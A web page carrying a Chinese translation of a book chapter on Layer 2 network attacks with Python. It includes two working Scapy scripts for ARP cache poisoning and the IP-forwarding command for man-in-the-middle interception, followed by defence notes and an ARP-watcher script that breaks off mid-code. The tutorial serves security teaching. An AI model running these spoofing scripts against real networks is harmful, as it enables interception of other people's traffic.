<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<link rel="stylesheet" type="text/css" href="style/basic.css" />
<link rel="stylesheet" type="text/css" href="style/detail.css" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>马可木屋</title>
<script type="text/javascript" src="js/detail.js"></script>
<script type="text/javascript" src="config/static.php?id=16&type=detail"></script>
</head>
<body>
<script type="text/javascript" src="config/static.php?type=header"></script>
<div id="top">
	<script type="text/javascript">getHeader();</script>	<a href="#" class="adv">这里可以放置文字广告1</a>
	<a href="#" class="adv">这里可以放置文字广告2</a>
</div>
<div id="header">
	<h1><a href="###">hejunweimake</a></h1>
	<div class="adver">
		<a href="#"><img src="images/adver.png" alt="advertisment" /></a>
	</div>
</div>
<div id="nav">
	<ul>
		<li><a href="./">首页</a></li>
						<li><a href="list.php?id=12">黑客联盟</a></li>
				<li><a href="list.php?id=3">时尚女人</a></li>
				<li><a href="list.php?id=4">科技频道</a></li>
				<li><a href="list.php?id=5">智能手机</a></li>
				<li><a href="list.php?id=8">美容护肤</a></li>
				<li><a href="list.php?id=9">热门汽车</a></li>
				<li><a href="list.php?id=10">房产家居</a></li>
				<li><a href="list.php?id=11">读书教育</a></li>
				<li><a href="list.php?id=1">军事动态</a></li>
				<li><a href="list.php?id=2">八卦娱乐</a></li>
					</ul>
</div>
<div id="search">
	<form>
		<select name="search">
			<option select="selected">按标题搜索</option>
			<option>按关键字搜索</option>
			<option>全局查询</option>
		</select>
		<input type="text" name="keyword" class="text" />
		<input type="submit" name="send" class="submit" value="搜索" />
	</form>
	
	<strong>TAG标签：</strong>
	
	<ul>
		<li><a href="#">美女(3)</a></li>
		<li><a href="#">游戏(5)</a></li>
		<li><a href="#">基金(2)</a></li>
		<li><a href="#">音乐(3)</a></li>
		<li><a href="#">体育(2)</a></li>
		<li><a href="#">直播(2)</a></li>
		<li><a href="#">陕西(1)</a></li>
	</ul>
</div>



<div id="detail">
	<h2>当前位置 > <a href='list.php?id=12'>黑客联盟</a> > <a href='list.php?id=23'>wifi破解</a></h2>
	<h3>Python网络攻防之第二层攻击</h3>
	<div class="d1">时间：2016-04-10 17:43:54　来源：乌云　作者：贺钧威　阅读量：<script type="text/javascript">getContentCount();</script> 次</div>
	<div class="d2">Python网络攻防之第二层攻击</div>
	<div class="d3"><p>本章节节选翻译自<em>《Understanding Network Hacks: Attack and Defense with Python》</em>中的第四章<em>Layer 2 Attacks</em>。该书通过网络层次划分介绍漏洞，并使用<code>Python</code>编写相关利用工具进行网络攻防，每小节均按照&ldquo;<code>原理--代码--解释--防御</code>&rdquo;的结构行文，此书也可与<em>《Python黑帽子:黑客与渗透测试编程之道》</em>相互参照学习，相信会达到较好的效果呦。另译者水平有限，如有错误还请指正与海涵。</p>

<h1>0x00 摘要</h1>

<hr />
<p>在本章第二层攻击当中，我们将进入网络<code>hacking</code>的奇幻之旅。让我们回顾一下，第二层是负责在以太网中，使用MAC地址来发送数据包。除了<code>ARP</code>攻击，我们将探讨交换机是如何应对<code>DOS</code>攻击的，以及如何逃逸出<code>VLAN</code>环境。</p>

<h1>0x01 需求模块</h1>

<hr />
<p>在<code>Python</code>中，你不必在意原始套接字或网络字节顺序，借由<code>Philippe Biondi</code>编写的<code>Scapy</code>，具有世界上最好的数据包生成器，你可以轻松地定制数据包。既不像在<code>Libnet</code>和<code>C</code>中那样需要指针运算，也不像在<code>RawIP</code>和<code>Perl</code>中，或者是在<code>Scruby</code>和<code>Ruby</code>中，你会被有限的几种协议所束缚。<code>Scapy</code>可以构造从<code>ARP</code>到<code>IP/ICMP</code>，再到<code>TCP/UDP</code>和<code>DNS/DHCP</code>等所有<code>OSI</code>层上的数据包，甚至是更不常见的协议也同样被支持，比如<code>BOOTP</code>, <code>GPRS</code>, <code>PPPoE</code>, <code>SNMP</code>, <code>Radius</code>, <code>Infrared</code>, <code>L2CAP/HCI</code>, <code>EAP</code>。</p>

<p>现在让我们在第二层网络上，使用<code>Scapy</code>来制造一些麻烦吧！首先你需要用如下的命令安装它：</p>

<pre>
pip install Scapy
</pre>

<p>现在你将步入经典著名的中间人攻击！</p>

<h1>0x02 ARP-Cache-Poisoning</h1>

<hr />
<p>如果一台主机想要发送<code>IP</code>数据包到另一台主机，就必须预先通过使用<code>ARP</code>协议请求目的<code>MAC</code>地址。这个询问会向网络中的所有成员广播。在一个完美的世界中，只有应答的主机是所需的目的主机。在一个不那么完美的世界中，攻击者会每隔几秒向它的受害者发送一个<code>ARP</code>应答报文，但是是以它自己的<code>MAC</code>地址作为响应，从而重定向该连接到其自身。因为大多数的操作系统都接受它们从未询问过的应答报文，所以该攻击才会生效！</p>

<table border="0" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td>
			<p>1</p>

			<p>2</p>

			<p>3</p>

			<p>4</p>

			<p>5</p>

			<p>6</p>

			<p>7</p>

			<p>8</p>

			<p>9</p>

			<p>10</p>

			<p>11</p>

			<p>12</p>

			<p>13</p>

			<p>14</p>

			<p>15</p>

			<p>16</p>

			<p>17</p>

			<p>18</p>

			<p>19</p>

			<p>20</p>

			<p>21</p>

			<p>22</p>
			</td>
			<td>
			<p><code>#!/usr/bin/python</code></p>

			<p><code>import</code> <code>sys</code></p>

			<p><code>import</code> <code>time</code></p>

			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sendp, ARP, Ether&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>3</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot;: &lt;target&gt; &lt;spoof_ip&gt;&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>1</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>iface </code><code>=</code> <code>&quot;eth0&quot;</code></p>

			<p><code>target_ip </code><code>=</code> <code>sys.argv[</code><code>1</code><code>]</code></p>

			<p><code>fake_ip </code><code>=</code> <code>sys.argv[</code><code>2</code><code>]&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>ethernet </code><code>=</code> <code>Ether()</code></p>

			<p><code>arp </code><code>=</code> <code>ARP(pdst</code><code>=</code><code>target_ip,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>psrc</code><code>=</code><code>fake_ip,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>op</code><code>=</code><code>&quot;is-at&quot;</code><code>)</code></p>

			<p><code>packet </code><code>=</code> <code>ethernet </code><code>/</code> <code>arp&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>while</code> <code>True</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sendp(packet, iface</code><code>=</code><code>iface)</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>time.sleep(</code><code>10</code><code>)</code></p>
			</td>
		</tr>
	</tbody>
</table>

<p>在<code>Scapy</code>的帮助下，我们构造了一个名为<code>packet</code>的数据包，里面包括一个<strong>Ethernet()</strong>及一个<strong>ARP()</strong>头。在ARP头部中，我们设置了受害者的IP地址（<code>target_ip</code>）和我们想劫持所有连接的IP地址（<code>fake_ip</code>）。对于最后一个参数，我们设置<strong>OP-Code</strong>为<code>is-at</code>，声明该数据包为一个ARP响应。然后<code>sendp()</code>函数在每次发送数据包时，都等待10秒并一直循环发送下去。</p>

<p>需要注意的是，你必须使用<code>sendp()</code>函数而不是<code>send()</code>函数，因为数据包应该在第二层被发送。<code>send()</code>则是在第三层发送数据包。</p>

<p>最后，要记得启用IP转发，否则你的主机会阻塞来自受害者的连接。</p>

<pre>
sysctl net.ipv4.ip_forward=1
</pre>

<p>不要忘记检查像<code>IPtables</code>这样的数据包过滤器的设置，使用<code>pf</code>或<code>ipfw</code>或直接禁用它，现在已经了解了足够多的枯燥的理论知识，让我们直接进入一些实用的<code>Python</code>代码吧！</p>

<p>如果你只是用<code>fake_ip</code>来处理客户端的<code>ARP</code>缓存，那么你只会得到客户端的数据包，而无法接收到服务端的响应。如下图所示。</p>

<p><img alt="enter image description here" src="http://static.wooyun.org//drops/20150914/2015091406295823477.png" /></p>

<p>如下图所示，要强制通过攻击者的主机进行双向连接，攻击者就必须使用他的<code>MAC</code>地址，来伪造客户端和服务端的相关目的地址。</p>

<p><img alt="enter image description here" src="http://static.wooyun.org//drops/20150914/2015091406295940612.png" /></p>

<p>我们的第一段代码有些粗糙，它发送了大量的<code>ARP</code>报文，不仅产生了所需要的流量，而且也比较暴露。隐蔽的攻击者会采取另一种策略。</p>

<p>一台主机如果想要获取有关<code>IP</code>地址的信息，会发出一个<code>ARP</code>请求。我们将编写一个程序，等待<code>ARP</code>请求，并为每一个接收到的请求发送一个<code>ARP</code>欺骗响应。在交换环境中，这将导致每一个连接都会流经攻击者的主机，因为在<code>ARP</code>缓存中，每一个<code>IP</code>地址都会有攻击者的<code>MAC</code>地址。这个攻击更加优雅，不像之前的那个那么嘈杂，但还是很容易被一个训练有素的管理员检测到。</p>

<p>如下图所示，欺骗性的响应数据包和真实主机的响应数据包被并行发送。谁的数据包先被受害者的网卡接收到，则谁获胜。</p>

<p><img alt="enter image description here" src="http://static.wooyun.org//drops/20150914/2015091406295944994.png" /></p>

<table border="0" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td>
			<p>1</p>

			<p>2</p>

			<p>3</p>

			<p>4</p>

			<p>5</p>

			<p>6</p>

			<p>7</p>

			<p>8</p>

			<p>9</p>

			<p>10</p>

			<p>11</p>

			<p>12</p>

			<p>13</p>

			<p>14</p>

			<p>15</p>

			<p>16</p>

			<p>17</p>

			<p>18</p>

			<p>19</p>

			<p>20</p>

			<p>21</p>

			<p>22</p>

			<p>23</p>

			<p>24</p>

			<p>25</p>

			<p>26</p>

			<p>27</p>

			<p>28</p>
			</td>
			<td>
			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>import</code> <code>sys</code></p>

			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sniff, sendp, ARP, Ether&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot; &lt;iface&gt;&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>0</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p>&nbsp;</p>

			<p><code>def</code> <code>arp_poison_callback(packet):</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># Got ARP request?</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code> <code>packet[ARP].op </code><code>=</code><code>=</code> <code>1</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer </code><code>=</code> <code>Ether(dst</code><code>=</code><code>packet[ARP].hwsrc) </code><code>/</code> <code>ARP()</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].op </code><code>=</code> <code>&quot;is-at&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].hwdst </code><code>=</code> <code>packet[ARP].hwsrc</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].psrc </code><code>=</code> <code>packet[ARP].pdst</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>answer[ARP].pdst </code><code>=</code> <code>packet[ARP].psrc&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Fooling &quot;</code> <code>+</code> <code>packet[ARP].psrc </code><code>+</code> <code>&quot; that &quot;</code> <code>+</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>packet[ARP].pdst </code><code>+</code> <code>&quot; is me&quot;</code>&nbsp;&nbsp;&nbsp;</p>

			<p>&nbsp;</p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sendp(answer, iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>])&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>sniff(prn</code><code>=</code><code>arp_poison_callback,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>filter</code><code>=</code><code>&quot;arp&quot;</code><code>,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>],</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>store</code><code>=</code><code>0</code><code>)</code></p>
			</td>
		</tr>
	</tbody>
</table>

<p>从参数<code>iface</code>指定的网卡中，<code>sniff()</code>函数无限循环地读取数据包。将<code>PACP</code>过滤器设置为<code>arp</code>，使接收到的数据包都被自动过滤，来保证我们的回调函数<code>arp_poison_callback</code>在被调用时，只有<code>ARP</code>数据包作为输入。同时由于参数<code>store=0</code>，数据包将不会被存储。</p>

<p><code>arp_poison_callback()</code>函数处理我们的实际工作。首先，它会检查<code>ARP</code>报文的<code>OP code</code>：当它是1时则为一个<code>ARP</code>请求，然后我们来生成一个响应包，在响应数据包中，我们将请求包中的源<code>MAC</code>地址和<code>IP</code>地址作为目的<code>MAC</code>地址和<code>IP</code>地址。因为我们未定义源<code>MAC</code>地址，所以<code>Scapy</code>会自动插入发送数据包的网络接口地址。</p>

<p><code>ARP</code>中<code>IP</code>与<code>MAC</code>地址的对应关系会被缓存一段时间，因为它会被转储起来，对同一地址一遍又一遍地进行解析。可以用如下命令显示<code>ARP</code>缓存：</p>

<pre>
arp -an
? (192.168.13.5) at c0:de:de:ad:be:ef [ether] on eth0
</pre>

<p>这依赖于操作系统和它的版本，本地配置设置及地址被缓存的时间。</p>

<p>为了抵御<code>ARP</code>欺骗攻击，一方面可以使用<code>ARP</code>静态表，但是这同样可以被接收到的<code>ARP</code>响应所覆盖，这些均依赖于操作系统对<code>ARP</code>的处理代码。另一方面也可以使用像<code>ARP watcher</code>这样的工具。<code>ARP watcher</code>监控<code>ARP</code>流量，并报告可疑行为但并不阻止。现在最先进的入侵检测系统可以检测到ARP缓存中毒攻击。你应该使用上面的代码，检查一下你的<code>IDS</code>，看看它是如何表现的。</p>

<h1>0x03 ARP-Watcher</h1>

<hr />
<p>接下来我们编写一个小工具，来报告所有新连接到我们网络的设备，为此它必须能够记住所有<code>IP</code>和<code>MAC</code>地址的对应关系。此外，它还可以检测出一个网络设备是否突然更改了它的<code>MAC</code>地址。</p>

<table border="0" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td>
			<p>1</p>

			<p>2</p>

			<p>3</p>

			<p>4</p>

			<p>5</p>

			<p>6</p>

			<p>7</p>

			<p>8</p>

			<p>9</p>

			<p>10</p>

			<p>11</p>

			<p>12</p>

			<p>13</p>

			<p>14</p>

			<p>15</p>

			<p>16</p>

			<p>17</p>

			<p>18</p>

			<p>19</p>

			<p>20</p>

			<p>21</p>

			<p>22</p>

			<p>23</p>

			<p>24</p>

			<p>25</p>

			<p>26</p>

			<p>27</p>

			<p>28</p>

			<p>29</p>

			<p>30</p>

			<p>31</p>

			<p>32</p>

			<p>33</p>

			<p>34</p>

			<p>35</p>

			<p>36</p>

			<p>37</p>

			<p>38</p>

			<p>39</p>

			<p>40</p>

			<p>41</p>

			<p>42</p>

			<p>43</p>

			<p>44</p>

			<p>45</p>

			<p>46</p>

			<p>47</p>

			<p>48</p>

			<p>49</p>

			<p>50</p>

			<p>51</p>

			<p>52</p>

			<p>53</p>

			<p>54</p>

			<p>55</p>

			<p>56</p>

			<p>57</p>

			<p>58</p>

			<p>59</p>

			<p>60</p>

			<p>61</p>

			<p>62</p>

			<p>63</p>

			<p>64</p>

			<p>65</p>

			<p>66</p>

			<p>67</p>
			</td>
			<td>
			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sniff, ARP</code></p>

			<p><code>from</code> <code>signal </code><code>import</code> <code>signal, SIGINT</code></p>

			<p><code>import</code> <code>sys&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>arp_watcher_db_file </code><code>=</code> <code>&quot;/var/cache/arp-watcher.db&quot;</code></p>

			<p><code>ip_mac </code><code>=</code> <code>{}&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code># Save ARP table on shutdown</code></p>

			<p><code>def</code> <code>sig_int_handler(signum, frame):</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Got SIGINT. Saving ARP database...&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>try</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>f </code><code>=</code> <code>open</code><code>(arp_watcher_db_file, </code><code>&quot;w&quot;</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>for</code> <code>(ip, mac) </code><code>in</code> <code>ip_mac.items():</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>f.write(ip </code><code>+</code> <code>&quot; &quot;</code> <code>+</code> <code>mac </code><code>+</code> <code>&quot;\n&quot;</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>f.close()</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Done.&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>except</code> <code>IOError:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Cannot write file &quot;</code> <code>+</code> <code>arp_watcher_db_file</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>1</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p>&nbsp;</p>

			<p><code>def</code> <code>watch_arp(pkt):</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># got is-at pkt (ARP response)</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code> <code>pkt[ARP].op </code><code>=</code><code>=</code> <code>2</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>pkt[ARP].hwsrc </code><code>+</code> <code>&quot; &quot;</code> <code>+</code> <code>pkt[ARP].psrc&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># Device is new. Remember it.</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>if</code> <code>ip_mac.get(pkt[ARP].psrc) </code><code>=</code><code>=</code> <code>None</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Found new device &quot;</code> <code>+</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pkt[ARP].hwsrc </code><code>+</code> <code>&quot; &quot;</code> <code>+</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pkt[ARP].psrc</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[pkt[ARP].psrc] </code><code>=</code> <code>pkt[ARP].hwsrc&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code># Device is known but has a different IP</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>elif</code> <code>ip_mac.get(pkt[ARP].psrc) </code><code>and</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[pkt[ARP].psrc] !</code><code>=</code> <code>pkt[ARP].hwsrc:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>pkt[ARP].hwsrc </code><code>+</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>&quot; has got new ip &quot;</code> <code>+</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pkt[ARP].psrc </code><code>+</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>&quot; (old &quot;</code> <code>+</code> <code>ip_mac[pkt[ARP].psrc] </code><code>+</code> <code>&quot;)&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[pkt[ARP].psrc] </code><code>=</code> <code>pkt[ARP].hwsrc&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>signal(SIGINT, sig_int_handler)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot; &lt;iface&gt;&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>0</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>try</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>fh </code><code>=</code> <code>open</code><code>(arp_watcher_db_file, </code><code>&quot;r&quot;</code><code>)</code></p>

			<p><code>except</code> <code>IOError:</code></p>

